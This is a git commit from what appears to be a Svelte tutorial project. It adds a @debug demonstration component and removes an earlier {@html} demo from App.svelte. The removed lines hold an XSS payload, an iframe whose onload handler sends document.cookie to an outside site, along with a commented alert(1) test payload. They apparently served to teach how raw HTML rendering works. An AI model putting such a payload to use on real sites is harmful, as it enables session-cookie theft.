ab4dd23618e07ec0bff131a419c2f93a776a4c98
LeeYongKyu <knsesang2000@gmail.com>
2021-03-08 10:45:08 +0900

    [ADD] @debug

---
+++ src/@debug.svelte
@@ -0,0 +1,17 @@
+<script>
+	let name = 'heropy';
+	let isName = true;
+	let index = 0;
+</script>
+
+<!-- @debug 디버그함수를 이용해서도 값을 찍어볼수 있다-->
+
+{@debug index, name, isName}
+<h1
+	on:click={() => {
+		index = index + 1;
+		console.log(index);
+	}}
+>
+	{name}
+</h1>
--- src/App.svelte
+++ src/App.svelte
@@ -1,10 +1,2 @@
 <script>
-	let h1 = '<h1>heropy</h1>';
-	// let xss = '<iframe onload="alert(1)"></iframe>';
-	let xss =
-		'<iframe onload="document.location=`https://heropy.blog?${document.cookie}`"></iframe>';
 </script>
-
-<!-- @html 을 넣어주면 문자열을 html 해석해서 출력한다 -->
-{@html h1}
-{@html xss}
